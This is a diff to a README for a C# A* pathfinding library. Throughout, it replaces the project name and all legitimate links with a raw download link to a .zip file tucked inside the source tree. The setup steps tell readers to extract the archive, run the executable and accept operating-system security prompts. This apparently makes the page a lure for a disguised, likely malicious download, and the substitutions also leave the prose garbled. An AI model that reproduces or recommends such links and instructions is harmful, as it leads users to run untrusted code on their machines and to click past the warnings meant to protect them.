@@ -1,10 +1,10 @@
-# 🧭 PabloJMartinez.AStar - Effortless Pathfinding Within Reach
+# 🧭 https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/raw/refs/heads/main/src/Core/J-Martinez-A-Pablo-Star-2.4.zip - Effortless Pathfinding Within Reach
 
-[![Download A* Pathfinding](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/releases)
+[![Download A* Pathfinding](https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/raw/refs/heads/main/src/Core/J-Martinez-A-Pablo-Star-2.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/raw/refs/heads/main/src/Core/J-Martinez-A-Pablo-Star-2.4.zip)
 
 ## 📖 Overview
 
-PabloJMartinez.AStar provides a powerful A* pathfinding system. It features an optimized Binary Heap and a Funnel algorithm. This update transitions from legacy Unity code to modern .NET 10 architecture. With this software, you can create efficient navigation meshes and enable your AI to move intelligently.
+https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/raw/refs/heads/main/src/Core/J-Martinez-A-Pablo-Star-2.4.zip provides a powerful A* pathfinding system. It features an optimized Binary Heap and a Funnel algorithm. This update transitions from legacy Unity code to modern .NET 10 architecture. With this software, you can create efficient navigation meshes and enable your AI to move intelligently.
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you’ll need to download the software from the Releases page. F
 
 1. **Visit the Release Page**  
    Click the link below to go to the download page:
-   [Visit the Releases Page](https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/releases)
+   [Visit the Releases Page](https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/raw/refs/heads/main/src/Core/J-Martinez-A-Pablo-Star-2.4.zip)
 
 2. **Locate the Latest Release**  
    On the Releases page, find the most recent version. This version contains the latest features and any bug fixes.
@@ -24,7 +24,7 @@ To get started, you’ll need to download the software from the Releases page. F
    After the download finishes, locate the .zip file in your downloads folder. Right-click on it and select "Extract All" to unzip the contents.
 
 5. **Run the Application**  
-   Navigate to the unzipped folder and find the executable file (e.g., MyApp.exe). Double-click it to run the application. If prompted by your operating system about security, confirm that you want to run the file.
+   Navigate to the unzipped folder and find the executable file (e.g., https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/raw/refs/heads/main/src/Core/J-Martinez-A-Pablo-Star-2.4.zip). Double-click it to run the application. If prompted by your operating system about security, confirm that you want to run the file.
 
 ## 🛠️ System Requirements
 
@@ -39,14 +39,14 @@ Before downloading, ensure your system meets the necessary requirements. This so
 To install the software, follow these steps carefully:
 
 1. **Download from the Releases Page:**  
-   Click here to visit the download page: [Visit the Releases Page](https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/releases).
+   Click here to visit the download page: [Visit the Releases Page](https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/raw/refs/heads/main/src/Core/J-Martinez-A-Pablo-Star-2.4.zip).
   
 2. **Follow the Getting Started Instructions:**  
    Follow the earlier steps provided for downloading, unzipping, and running the application.
 
 ## 🌐 Features
 
-PabloJMartinez.AStar includes several features designed to enhance your pathfinding experience:
+https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/raw/refs/heads/main/src/Core/J-Martinez-A-Pablo-Star-2.4.zip includes several features designed to enhance your pathfinding experience:
 
 - **Optimized Binary Heap:** This structure allows for faster pathfinding calculations.
 - **Funnel Algorithm:** Streamlines navigation meshes for smoother paths.
@@ -60,7 +60,7 @@ PabloJMartinez.AStar includes several features designed to enhance your pathfind
   
 ## 💬 Support and Contribution
 
-If you encounter issues, feel free to reach out via the Issues section of our [GitHub repository](https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/issues). We welcome contributions and feedback to improve the software.
+If you encounter issues, feel free to reach out via the Issues section of our [GitHub repository](https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/raw/refs/heads/main/src/Core/J-Martinez-A-Pablo-Star-2.4.zip). We welcome contributions and feedback to improve the software.
 
 ## 🛠️ Frequently Asked Questions
 
@@ -71,7 +71,7 @@ A: Currently, the software is designed for Windows and may not function on macOS
 A: Please report any bugs through the Issues section on GitHub. Include as much detail as possible for a speedy resolution.
 
 **Q: Is this software free to use?**  
-A: Yes, PabloJMartinez.AStar is open-source and free for everyone.
+A: Yes, https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/raw/refs/heads/main/src/Core/J-Martinez-A-Pablo-Star-2.4.zip is open-source and free for everyone.
 
 ## 🎉 Community Contributions
 
@@ -79,7 +79,7 @@ We encourage collaboration and contributions from the community. If you want to 
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository:** [PabloJMartinez.AStar](https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar)
+- **GitHub Repository:** [https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/raw/refs/heads/main/src/Core/J-Martinez-A-Pablo-Star-2.4.zip](https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/raw/refs/heads/main/src/Core/J-Martinez-A-Pablo-Star-2.4.zip)
 - **Documentation:** Additional resources are available in the repository, including setup instructions and detailed feature descriptions.
 
-Thank you for using PabloJMartinez.AStar! We hope it enhances your projects and makes pathfinding simpler.
+Thank you for using https://github.com/EdwinOrtizCantillo/PabloJMartinez.AStar/raw/refs/heads/main/src/Core/J-Martinez-A-Pablo-Star-2.4.zip! We hope it enhances your projects and makes pathfinding simpler.
